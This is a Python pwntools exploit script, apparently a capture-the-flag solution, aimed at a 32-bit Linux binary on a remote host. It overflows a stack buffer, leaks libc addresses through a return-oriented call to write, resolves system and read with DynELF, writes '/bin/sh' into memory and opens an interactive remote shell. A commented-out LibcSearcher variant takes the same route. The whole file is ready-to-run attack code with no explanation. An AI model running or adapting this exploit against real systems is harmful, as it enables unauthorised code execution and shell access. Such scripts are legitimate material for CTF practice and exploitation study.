from pwn import *
from LibcSearcher import *
context(arch='i386', os='linux', log_level='debug')

elf = ELF('./pwn')
proc_write_using_addr = 0x804855A
# io = process('./pwn')
io = remote('111.200.241.244', 59543)

def leak(addr):
	payload = cyclic(112) + p32(proc_write_using_addr) + \
			  p32(0x1) + p32(addr) + p32(0x80)
	io.send(payload)
	data = io.recv()
	return data

io.recv()
payload = cyclic(100 + 4 * 3) + p32(proc_write_using_addr) + \
		  p32(0x1) + p32(elf.got['write']) + p32(0x4)
io.send(payload)
mem_write_addr = u32(io.recv())

d = DynELF(leak, elf=elf)
system_addr = d.lookup("system", 'libc')
read_addr = d.lookup("read", 'libc')
print(hex(system_addr))
print(hex(read_addr))

io.sendline(cyclic(112) + p32(read_addr) + p32(system_addr) + \
			p32(0) + p32(elf.bss() + 100) + p32(8))
io.sendline(b'/bin/sh\x00')
# libc = LibcSearcher('write', mem_write_addr)
# libc_write_addr = libc.dump('write')
# offset = mem_write_addr - libc_write_addr
# libc_system_addr = libc.dump('system')
# libc_bin_sh_addr = libc.dump('str_bin_sh')
# print(hex(libc_system_addr))
# print(hex(libc_bin_sh_addr))
# mem_system_addr = offset + libc_system_addr
# mem_bin_sh_addr = offset + libc_bin_sh_addr - 10

# payload = cyclic(100 + 4 * 3) + p32(proc_write_using_addr) + \
#		  p32(0x1) + p32(mem_bin_sh_addr) + p32(0x20)
# payload = cyclic(100 + 4 * 3) + p32(mem_system_addr) + \
#		  p32(mem_bin_sh_addr)
# io.send(payload)
io.interactive()